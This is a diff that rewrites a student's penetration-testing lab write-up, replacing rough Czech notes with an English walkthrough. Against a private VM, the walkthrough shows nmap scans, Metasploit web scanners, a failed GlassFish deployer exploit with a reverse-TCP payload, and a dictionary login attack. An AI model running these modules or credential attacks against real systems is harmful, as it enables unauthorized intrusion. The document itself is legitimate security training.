@@ -1,154 +1,58 @@
-# My_Little_Cyber_Projects_11
+# My Little Cyber Projects #11
 
-EXPLOITING METASPLOITABLE 2
-Metasploitable 2 is an intentionally vulnerable Ubuntu Linux virtual machine designed for security training and penetration testing practice. In this walkthrough, I will methodically exploit its weaknesses, demonstrating a common penetration testing lifecycle: Reconnaissance, Enumeration and Exploitation. My attacking platform will be Kali Linux.
- 
-CO CHCI DELAT?
+## Metasploitable 2 – Enumeration and GlassFish Investigation
 
-1. Průzkum a skenování (Reconnaissance)
-Identifikace cíle: Pomocí netdiscover nebo nmap zjistěte IP adresu Metasploitable stroje.
-Port Scanning (Nmap): Spusťte důkladný sken portů pro zjištění běžících služeb (nmap -sV -p- <IP_cile>).
-Vulnerability Scanning: Použijte nástroje jako Nessus nebo OpenVAS (pokud jsou instalovány v Kali) k automatickému vyhledání zranitelností. 
+### Goal
 
+This lab documents my work with an intentionally vulnerable virtual machine, Metasploitable 2, from Kali Linux. My objective was to practice the typical penetration testing workflow:
 
-2. Exploatace (Získání přístupu)
-Metasploit Framework: Toto je hlavní nástroj. Spusťte msfconsole a hledejte exploity pro verze služeb zjištěné nmapem.
-FTP backdoor: Zneužijte zranitelnou službu vsftpd 2.3.4 na portu 21, která umožňuje získat shell.
-Samba/SMB: Útoky na starou verzi Samby (port 139/445) pro získání root přístupu.
-Webové aplikace: Metasploitable obsahuje zranitelné webové aplikace (DVWA, Mutillidae). Zkuste SQL Injection nebo Cross-Site Scripting (XSS).
-Java RMI: Zneužijte port 1099 (Java RMI registry) pro vzdálené spuštění kódu. 
+1. Reconnaissance
+2. Enumeration
+3. Exploitation
+4. Analysis of the results
 
+---
 
-3. Post-Exploatace (Co dál po průniku)
-Privilege Escalation: Pokud získáte přístup jako běžný uživatel (msfadmin), pokuste se získat root práva (např. přes chybně nastavené SUID soubory nebo sudo práva).
-Získávání hesel: Prohledejte soubory /etc/shadow nebo použijte hashdump v Meterpreteru a pokuste se hesla prolomit pomocí John the Ripper.
-Pivoting: Zneužijte Metasploitable jako odrazový můstek pro útok na další (virtuální) stroje ve stejné vnitřní síti.
-4. Další praktiky
-Sniffing sítě: Použijte Wireshark v Kali k odposlouchávání nešifrované komunikace (Telnet, FTP, HTTP) probíhající mezi stroji.
-Analýza logů: Zkontrolujte, jaké stopy (logs) útok zanechal v /var/log/ na Metasploitable. 
+# Lab Setup
 
+| Machine                    | IP Address     | Purpose           |
+| -------------------------- | -------------- | ----------------- |
+| Kali Linux                 | 192.168.56.101 | Attacking machine |
+| Metasploitable / target VM | 192.168.56.102 | Vulnerable target |
 
-Základní info pro začátek
-Login do Metasploitable: msfadmin / msfadmin.
-Zjištění IP v Metasploitable: příkaz ifconfig
+I used a Host-Only Adapter in VirtualBox so that both machines could communicate only inside the virtual lab.
 
+---
 
+# 1. Reconnaissance
 
+First, I identified the IP address of the target.
 
+On the target machine I checked the interface configuration:
 
-Když používám Nmap, pomáhá mi zjistit, které porty jsou na cílovém zařízení otevřené a jaké služby na nich běží. 
+```bash
+ifconfig
+```
 
-Porty si představuji jako dveře do počítače – některé jsou zavřené, některé otevřené a za každými může být jiná služba, například SSH na portu 22 nebo FTP na portu 21. 
+Then from Kali I verified connectivity:
 
-Přepínač -sV používám tehdy, když chci zjistit verzi služby, která na portu běží. Díky tomu místo informace „na portu 22 je SSH“ zjistím například i konkrétní verzi. 
+```bash
+ping 192.168.56.102
+```
 
-Přepínač -sC spouští základní skripty, které umí získat další informace o službě nebo odhalit jednoduché zranitelnosti. 
+---
 
-Když chci prohledat všechny porty od 1 do 65535, použiji ještě -p-, protože běžný scan kontroluje jen nejčastěji používané porty.
+# 2. Initial Port Scan
 
+To quickly identify the most common open ports, I ran:
 
+```bash
+nmap -F 192.168.56.102
+```
 
->What does  the 3-letter acronym FTP stand for?
+Output:
 
-File Transfer Protocol
-
-Which port does the FTP service listen on usually?
-
-21
-
-$ sudo nmap 10.10.14.212
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-27 08:57 CDT
-Nmap scan report for 10.10.14.212
-Host is up (0.0000040s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT    STATE SERVICE
-22/tcp  open  ssh
-111/tcp open  rpcbind
-
-
-sudo nmap -sV -sC -p- 10.10.14.212
-
--p- prohledá všechny porty 1–65535
--sV zjistí, co na nich běží
--sC spustí základní detekční skripty
-
->What does  the 3-letter acronym FTP stand for?
-
-File Transfer Protocol
-
-Which port does the FTP service listen on usually?
-
-21
-
-$ sudo nmap 10.10.14.212
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-27 08:57 CDT
-Nmap scan report for 10.10.14.212
-Host is up (0.0000040s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT    STATE SERVICE
-22/tcp  open  ssh
-111/tcp open  rpcbind
-
-
-sudo nmap -sV -sC -p- 10.10.14.212
-
--p- prohledá všechny porty 1–65535
--sV zjistí, co na nich běží
--sC spustí základní detekční skripty
-
-
-EXERCICE1:
-To build a complete profile of the target, I executed an aggressive nmap scan using the -sC -sV -Pn arguments.
-
-1. Otevru Kali a metasploitable v me virtualni laboratori
-2. Ve wireshraku v metaploitable se zeptam arp-a na IP adresy
-3. v kali v terminalu provedu skan portu: nmap -sV 10.0.2.2
-4. uvidim otervene porty a sluzby
-5.v kali si otevru prohlize http://10.0.2.2
-6. to mi nefunguje, tak zkusim zjistit jak je na tom port 80 nmap -p 80 10.0.2.2
-7. kali pise, ze port 80 je TCP port, http, a je filtered
-
-Když nmap ukáže:
-
-80/tcp filtered http
-
-znamená to, že se Kali Linux k portu 80 na Metasploitable 2 vůbec nedostane — paket je blokovaný nebo VM nejsou ve stejné síti.
-
-
-EXERCISE2:
-1. nmap -sV 10.0.2.2
-	Hledám hlavně něco jako:
-
-	21/tcp open ftp
-	22/tcp open ssh
-	139 nebo 445 samba
-	3306 MySQL
-
-
-Po nmap -sV 10.0.2.2 jsem našla několik zajímavých otevřených portů. Další krok je vybrat jednu službu a zkusit její enumeraci. Pokud je otevřený port 21, mohu zkusit připojení přes File Transfer Protocol:
-Toto je muj vysledek:
-135/tcp open  msrpc         Microsoft Windows RPC
-445/tcp open  microsoft-ds?
-
-Port 135 je Microsoft RPC Endpoint Mapper a port 445 je Microsoft SMB. To znamená, že na cíli běží sdílení souborů a síťové služby typické pro Windows.
-
-Další krok je zkusit zjistit více informací o SMB na portu 445.
-
-Jeste si poznamenam: 10.0.2.15 je IP KALI!
-
-EXERCISE 3:
-Pracuji s Host-only Adapter Network settings.
-IP Metasploitable je 192.168.56.102
-
-1. Provedu mapování: nmap -F IP
-                                                                  
-┌──(kali㉿kali)-[~]
-└─$ nmap -F  192.168.56.102
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-30 16:20 EDT
-Nmap scan report for 192.168.56.102
-Host is up (0.00069s latency).
-Not shown: 84 closed tcp ports (reset)
-PORT      STATE SERVICE
+```text
 21/tcp    open  ftp
 22/tcp    open  ssh
 80/tcp    open  http
@@ -159,378 +63,273 @@ PORT      STATE SERVICE
 3389/tcp  open  ms-wbt-server
 8009/tcp  open  ajp13
 8080/tcp  open  http-proxy
-49152/tcp open  unknown
-49153/tcp open  unknown
-49154/tcp open  unknown
-49155/tcp open  unknown
-49156/tcp open  unknown
-49157/tcp open  unknown
-MAC Address: 08:00:27:B9:D4:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
 
-Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
+This immediately showed several interesting attack surfaces:
 
-2. Zjistim si vice informaci o portech, o kterych vim, ze jsou otevrene:
+* FTP on port 21
+* IIS web server on port 80
+* SMB on ports 139/445
+* MySQL on port 3306
+* GlassFish server on port 8080
+
+---
+
+# 3. Detailed Service Enumeration
+
+I then performed a more detailed scan using version detection and default NSE scripts:
+
+```bash
 nmap -sV -sC -p 21,22,80,135,139,445,3306,3389,8009,8080 192.168.56.102
+```
 
+Important findings:
 
-                                                                                                                        
-┌──(kali㉿kali)-[~]
-└─$ nmap -sV -sC -p 21,22,80,135,139,445,3306,3389,8009,8080 192.168.56.102
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-30 16:27 EDT
-Nmap scan report for 192.168.56.102
-Host is up (0.0011s latency).
+```text
+21/tcp   open  ftp    Microsoft ftpd
+80/tcp   open  http   Microsoft IIS 7.5
+445/tcp  open  microsoft-ds Windows Server 2008 R2
+8080/tcp open  http   Oracle GlassFish 4.0
+```
 
-PORT     STATE SERVICE        VERSION
-21/tcp   open  ftp            Microsoft ftpd
-| ftp-syst: 
-|_  SYST: Windows_NT
-22/tcp   open  ssh            OpenSSH 7.1 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 fd:08:98:ca:3c:e8:c1:3c:ea:dd:09:1a:2e:89:a5:1f (RSA)
-|_  521 7e:57:81:8e:f6:3c:1d:cf:eb:7d:ba:d1:12:31:b5:a8 (ECDSA)
-80/tcp   open  http           Microsoft IIS httpd 7.5
-|_http-title: Site doesn't have a title (text/html).
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/7.5
-135/tcp  open  msrpc          Microsoft Windows RPC
-139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
-445/tcp  open  microsoft-ds   Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
-3306/tcp open  mysql          MySQL 5.5.20-log
-| mysql-info: 
-|   Protocol: 10
-|   Version: 5.5.20-log
-|   Thread ID: 7
-|   Capabilities flags: 63487
-|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolOld, SupportsTransactions, FoundRows, InteractiveClient, ConnectWithDatabase, SupportsLoadDataLocal, Speaks41ProtocolNew, ODBCClient, SupportsCompression, LongPassword, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
-|   Status: Autocommit
-|   Salt: -x8JM%o#Z|%=CyX-v/"]
-|_  Auth Plugin Name: mysql_native_password
-3389/tcp open  ms-wbt-server?
-| ssl-cert: Subject: commonName=vagrant-2008R2
-| Not valid before: 2026-01-28T13:46:15
-|_Not valid after:  2026-07-30T13:46:15
-| rdp-ntlm-info: 
-|   Target_Name: VAGRANT-2008R2
-|   NetBIOS_Domain_Name: VAGRANT-2008R2
-|   NetBIOS_Computer_Name: VAGRANT-2008R2
-|   DNS_Domain_Name: vagrant-2008R2
-|   DNS_Computer_Name: vagrant-2008R2
-|   Product_Version: 6.1.7601
-|_  System_Time: 2026-03-30T20:28:35+00:00
-|_ssl-date: 2026-03-30T20:28:38+00:00; -2s from scanner time.
-8009/tcp open  ajp13          Apache Jserv (Protocol v1.3)
-|_ajp-methods: Failed to get a valid response for the OPTION request
-8080/tcp open  http           Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
-| http-methods: 
-|_  Potentially risky methods: PUT DELETE TRACE
-|_http-title: GlassFish Server - Server Running
-|_http-server-header: GlassFish Server Open Source Edition  4.0 
-MAC Address: 08:00:27:B9:D4:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+The scan also revealed:
 
-Host script results:
-|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
-| smb-security-mode: 
-|   account_used: <blank>
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   2:1:0: 
-|_    Message signing enabled but not required
-| smb-os-discovery: 
-|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
-|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
-|   Computer name: vagrant-2008R2
-|   NetBIOS computer name: VAGRANT-2008R2\x00
-|   Workgroup: WORKGROUP\x00
-|_  System time: 2026-03-30T13:28:35-07:00
-|_nbstat: NetBIOS name: VAGRANT-2008R2, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:b9:d4:c2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-| smb2-time: 
-|   date: 2026-03-30T20:28:35
-|_  start_date: 2026-03-30T20:14:29
+* HTTP TRACE enabled on port 80
+* SMB signing not required
+* GlassFish allowed risky methods such as PUT, DELETE and TRACE
 
+These findings suggested that the most promising direction would be the GlassFish server running on port 8080.
 
-Nejzajímavější věci, které jsem našla:
+---
 
-FTP na portu 21: Microsoft FTP Service
-Web na portu 80: Microsoft IIS 7.5 s povoleným TRACE
-SMB na 445: podpis není vyžadován
-Web na 8080: GlassFish Server 4.0
-AJP na 8009: často bývá spojený s Apache Tomcat nebo Java serverem
+# 4. Investigating the Web Server on Port 80
 
-Co dal?
-1. Web (80, 8080)
-2. FTP anonymous
-3. SMB shares
-4. Potom teprve hledat konkrétní zranitelnosti verzí, například pro:
-GlassFish Server 4.0
+I opened the site in the browser:
 
+```text
+http://192.168.56.102
+```
 
-EXERCISE 4:
-1.msfconsole:
-msf6 auxiliary(scanner/http/http_version) > use auxiliary/scanner/http/http_version
-msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.56.102
-RHOSTS => 192.168.56.102
-msf6 auxiliary(scanner/http/http_version) > set RPORT 80
-RPORT => 80
-msf6 auxiliary(scanner/http/http_version) > run
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/http_version) > 
+Then I used Metasploit for additional web enumeration.
 
-Na portu 80 teď pokračuji enumerací webu – cílem je zjistit, co tam běží a jestli existují další stránky nebo zranitelnosti.
-
-V Metasploit Framework:
-
-RHOSTS = cílová IP adresa nebo více IP adres
-RPORT = port na cílovém stroji, proti kterému modul poběží
-
-Takže:
-
+```text
+use auxiliary/scanner/http/dir_scanner
 set RHOSTS 192.168.56.102
-
-říká Metasploitu: „útoč / skenuj tento počítač“.
-
-A:
-
 set RPORT 80
+run
+```
 
-říká: „použij port 80“, tedy webserver.
+Result:
 
-Metasploit Documentation: https://docs.metasploit.com/
+```text
+[+] Found http://192.168.56.102:80/aspnet_client/ 403
+```
 
-msf6 > use auxiliary/scanner/http/dir_scanner
-msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.56.102
-RHOSTS => 192.168.56.102
-msf6 auxiliary(scanner/http/dir_scanner) > set RPORT 80
-RPORT => 80
-msf6 auxiliary(scanner/http/dir_scanner) > run
-[*] Detecting error code
-[*] Using code '404' as not found for 192.168.56.102
-[+] Found http://192.168.56.102:80/aspnet_client/ 403 (192.168.56.102)
+This indicated that:
 
-To znamená, že webserver našel adresář /aspnet_client/, ale vrací HTTP 403 = existuje, ale nemám do něj přístup.
+* the directory exists
+* access is forbidden
+* the web server likely hosts an ASP.NET application
 
-/aspnet_client/ je typický adresář pro ASP.NET, takže na serveru pravděpodobně běží ASP.NET aplikace na Microsoft IIS.
+Next I searched for common files:
 
-Další scanner, který hledá známé soubory:
-msf6 auxiliary(scanner/http/dir_scanner) > Interrupt: use the 'exit' command to quit
-msf6 auxiliary(scanner/http/dir_scanner) > use auxiliary/scanner/http/files_dir
-msf6 auxiliary(scanner/http/files_dir) > set RHOSTS 192.168.56.102
-RHOSTS => 192.168.56.102
-msf6 auxiliary(scanner/http/files_dir) > set RPORT 80
-RPORT => 80
-msf6 auxiliary(scanner/http/files_dir) > run
-[*] Using code '404' as not found for files with extension .null
-[*] Using code '404' as not found for files with extension .backup
-[*] Using code '404' as not found for files with extension .bak
-[*] Using code '404' as not found for files with extension .c
-[*] Using code '404' as not found for files with extension .cfg
-[*] Using code '404' as not found for files with extension .class
-[*] Using code '404' as not found for files with extension .copy
-[*] Using code '404' as not found for files with extension .conf
-[*] Using code '404' as not found for files with extension .exe
-[*] Using code '404' as not found for files with extension .html
+```text
+use auxiliary/scanner/http/files_dir
+set RHOSTS 192.168.56.102
+set RPORT 80
+run
+```
+
+Result:
+
+```text
 [+] Found http://192.168.56.102:80/index.html 200
-[*] Using code '404' as not found for files with extension .htm
-[*] Using code '404' as not found for files with extension .ini
-[*] Using code '404' as not found for files with extension .log
-[*] Using code '404' as not found for files with extension .old
-[*] Using code '404' as not found for files with extension .orig
-[*] Using code '404' as not found for files with extension .php
-[*] Using code '404' as not found for files with extension .tar
-[*] Using code '404' as not found for files with extension .tar.gz
-[*] Using code '404' as not found for files with extension .tgz
-[*] Using code '404' as not found for files with extension .tmp
-[*] Using code '404' as not found for files with extension .temp
-[*] Using code '404' as not found for files with extension .txt
-[*] Using code '404' as not found for files with extension .zip
-[*] Using code '404' as not found for files with extension ~
-[*] Using code '404' as not found for files with extension 
-[*] Using code '404' as not found for files with extension 
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/files_dir) >
- 
-Našla jsem /index.html, takže otevřu v prohlížeči:
+```
 
+I then opened:
+
+```text
 http://192.168.56.102/index.html
+```
 
-Podívám se:
+and inspected both the visible page and the page source in Firefox.
 
-co je na stránce napsané
-jestli jsou tam nějaké odkazy
-případně dám ve Firefoxu „View page Source“
+---
 
-Pak se přesunu na port 8080 a otevřu:
+# 5. GlassFish Enumeration on Port 8080
 
-http://192.168.56.102:8080 (na portu 8080 běží výchozí stránka GlassFish Server 4.0. Nejzajímavější bývá administrační rozhraní.)
+The web server on port 8080 returned the default GlassFish page:
 
-V Metasploit Framework se vrátím zpět:
+```text
+GlassFish Server - Server Running
+```
 
-back
+I confirmed this with Metasploit:
 
-Pak spustím scanner pro název stránky na portu 8080:
+```text
+use auxiliary/scanner/http/title
+set RHOSTS 192.168.56.102
+set RPORT 8080
+run
+```
 
+Output:
 
-msf6 auxiliary(scanner/http/files_dir) > back
-msf6 > use auxiliary/scanner/http/title
-msf6 auxiliary(scanner/http/title) > set RHOSTS 192.168.56.102
-RHOSTS => 192.168.56.102
-msf6 auxiliary(scanner/http/title) > set RPORT 8080
-RPORT => 8080
-msf6 auxiliary(scanner/http/title) > run
-[+] [192.168.56.102:8080] [C:200] [R:] [S:] GlassFish Server - Server Running
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/title) > 
+```text
+[+] GlassFish Server - Server Running
+```
 
-Nakonec vyhledám moduly pro GlassFish Server - {glassfish_deployer je exploit}:
+Then I searched for GlassFish-related modules:
 
+```text
+search glassfish
+```
 
-msf6 auxiliary(scanner/http/title) > search glassfish
+Interesting modules included:
 
-Matching Modules
-================
+```text
+auxiliary/scanner/http/glassfish_login
+exploit/multi/http/glassfish_deployer
+auxiliary/scanner/http/glassfish_traversal
+```
 
-   #   Name                                                                       Disclosure Date  Rank       Check  Description
-   -   ----                                                                       ---------------  ----       -----  -----------
-   0   exploit/multi/http/struts_code_exec_classloader                            2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
-   1     \_ target: Java                                                          .                .          .      .
-   2     \_ target: Linux                                                         .                .          .      .
-   3     \_ target: Windows                                                       .                .          .      .
-   4     \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)  .                .          .      .
-   5   auxiliary/scanner/http/glassfish_login                                     .                normal     No     GlassFish Brute Force Utility
-   6   auxiliary/dos/http/hashcollision_dos                                       2011-12-28       normal     No     Hashtable Collisions
-   7   exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl       2012-10-16       excellent  No     Java Applet AverageRangeStatisticImpl Remote Code Execution
-   8     \_ target: Generic (Java Payload)                                        .                .          .      .
-   9     \_ target: Windows x86 (Native Payload)                                  .                .          .      .
-   10    \_ target: Mac OS X x86 (Native Payload)                                 .                .          .      .
-   11    \_ target: Linux x86 (Native Payload)                                    .                .          .      .
-   12  auxiliary/scanner/http/glassfish_traversal                                 2015-08-08       normal     No     Path Traversal in Oracle GlassFish Server Open Source Edition                                                                                                                    
-   13  exploit/multi/http/glassfish_deployer                                      2011-08-04       excellent  No     Sun/Oracle GlassFish Server Authenticated Code Execution
-   14    \_ target: Automatic                                                     .                .          .      .
-   15    \_ target: Java Universal                                                .                .          .      .
-   16    \_ target: Windows Universal                                             .                .          .      .
-   17    \_ target: Linux Universal                                               .                .          .      .
+---
 
+# 6. Attempted Exploitation of the GlassFish Admin Console
 
-Interact with a module by name or index. For example info 17, use 17 or use exploit/multi/http/glassfish_deployer
-After interacting with a module you can manually set a TARGET with set TARGET 'Linux Universal'
+The GlassFish deployer exploit requires the administration interface on port 4848.
 
-msf6 exploit(multi/http/glassfish_deployer) > set RHOSTS 192.168.56.102
-RHOSTS => 192.168.56.102
-msf6 exploit(multi/http/glassfish_deployer) > set RPORT 4848
-RPORT => 4848
-msf6 exploit(multi/http/glassfish_deployer) > show options
+I first confirmed that the port was open:
 
-Module options (exploit/multi/http/glassfish_deployer):
+```bash
+nmap -Pn -p 4848 192.168.56.102
+```
 
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   APP_RPORT  8080             yes       The Application interface port
-   PASSWORD                    yes       The password for the specified username
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     192.168.56.102   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT      4848             yes       The target port (TCP)
-   SSL        false            no        Negotiate SSL for outgoing connections
-   TARGETURI  /                yes       The URI path of the GlassFish Server
-   USERNAME   admin            yes       The username to authenticate as
-   VHOST                       no        HTTP server virtual host
+Output:
 
+```text
+4848/tcp open appserv-http
+```
 
-Payload options (linux/x86/meterpreter/reverse_tcp):
+Then I configured the Metasploit exploit:
 
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
+```text
+use exploit/multi/http/glassfish_deployer
+set RHOSTS 192.168.56.102
+set RPORT 4848
+set USERNAME admin
+set PASSWORD adminadmin
+set LHOST 192.168.56.101
+run
+```
 
+Result:
 
-Exploit target:
+```text
+Exploit aborted due to failure: Connection timed out
+```
 
-   Id  Name
-   --  ----
-   0   Automatic
+The failure suggested that the admin credentials were incorrect.
 
+---
 
+# 7. Password Testing with a Dictionary Attack
 
-View the full module info with the info, or info -d command.
+To test whether the GlassFish administration console used weak or default credentials, I switched to:
 
-msf6 exploit(multi/http/glassfish_deployer) > set RHOSTS 192.168.56.102
-RHOSTS => 192.168.56.101
-msf6 exploit(multi/http/glassfish_deployer) > set RPORT 4848
-RPORT => 4848
-msf6 exploit(multi/http/glassfish_deployer) > set USERNAME admin
-USERNAME => admin
-msf6 exploit(multi/http/glassfish_deployer) > set PASSWORD adminadmin
-PASSWORD => adminadmin
-msf6 exploit(multi/http/glassfish_deployer) > set LHOST 192.168.56.101
-LHOST => 192.168.56.101
-msf6 exploit(multi/http/glassfish_deployer) > run
-[*] Started reverse TCP handler on 192.168.56.101:4444 
-[-] Exploit aborted due to failure: unknown: Connection timed out
-[*] Exploit completed, but no session was created.
-msf6 exploit(multi/http/glassfish_deployer) > 
+```text
+use auxiliary/scanner/http/glassfish_login
+```
 
-msf6 exploit(multi/http/glassfish_deployer) > nmap -Pn -p 4848 192.168.56.102
-[*] exec: nmap -Pn -p 4848 192.168.56.102
+Then I configured two wordlists:
 
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-31 12:40 EDT
-Nmap scan report for 192.168.56.102
-Host is up (0.0012s latency).
+```text
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+```
 
-PORT     STATE SERVICE
-4848/tcp open  appserv-http
-MAC Address: 08:00:27:B9:D4:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+These options tell Metasploit:
 
-Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
+* `USER_FILE` = list of usernames to try
+* `PASS_FILE` = list of passwords to try
 
-Dobře, takže port 4848 je otevřený. To znamená, že administrační konzole GlassFish Server běží, ale pravděpodobně nefungují přihlašovací údaje admin/adminadmin.
+Examples from the wordlists:
 
-msf6 > use auxiliary/scanner/http/glassfish_login
-msf6 auxiliary(scanner/http/glassfish_login) > 
-
-USER_FILE říká modulu, odkud má brát seznam uživatelských jmen.
-
-PASS_FILE říká, odkud má brát seznam hesel.
-
-znamená: „zkoušej postupně uživatele z tohoto souboru“, například:
-
-root
+```text
 admin
+root
 guest
 user
-test
+```
 
-A:
-
-set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
-
-znamená: „ke každému uživateli zkoušej hesla z tohoto souboru“, například:
-
+```text
 password
-123456
 admin
-toor
+123456
 guest
+```
 
-Modul pak automaticky zkouší kombinace jako:
+Metasploit automatically combines them into login attempts such as:
 
+```text
 admin : admin
 admin : password
 root : toor
 guest : guest
+```
 
-dokud něco nenajde.
+This is a dictionary attack, not a full brute force attack. I used a predefined list of common usernames and passwords rather than generating random combinations.
 
+Because this work was performed only inside my intentionally vulnerable lab, it was a legitimate penetration testing exercise.
 
-Můžu se podívat, co v těch souborech je:
+---
 
+# Bash Commands I Practiced
+
+```bash
+# verify network connectivity
+ping 192.168.56.102
+
+# quick port scan
+nmap -F 192.168.56.102
+
+# detailed scan
+nmap -sV -sC -p 21,22,80,135,139,445,3306,3389,8009,8080 192.168.56.102
+
+# check if the GlassFish admin interface is open
+nmap -Pn -p 4848 192.168.56.102
+
+# inspect the usernames wordlist
 cat /usr/share/metasploit-framework/data/wordlists/unix_users.txt
 
- a
-
+# inspect the passwords wordlist
 cat /usr/share/wordlists/metasploit/unix_passwords.txt
+
+# download the content of a web page
+curl http://192.168.56.102 -o response.bin
+```
+
+---
+
+# What I Learned
+
+* How to identify the correct IP address in a virtual lab
+* The difference between quick and detailed Nmap scans
+* How to interpret open ports and service versions
+* How to use `RHOSTS` and `RPORT` in Metasploit
+* How to enumerate a web server with Metasploit auxiliary modules
+* How to investigate a GlassFish server
+* The difference between a dictionary attack and brute force
+* Why default credentials are dangerous in real environments
+
+---
+
+# Next Steps
+
+In future labs I want to continue with:
+
+* SMB enumeration on ports 139/445
+* Testing anonymous FTP access
+* Exploring the GlassFish traversal module
+* Learning privilege escalation after initial access
+* Using Burp Suite to inspect requests sent to the web application
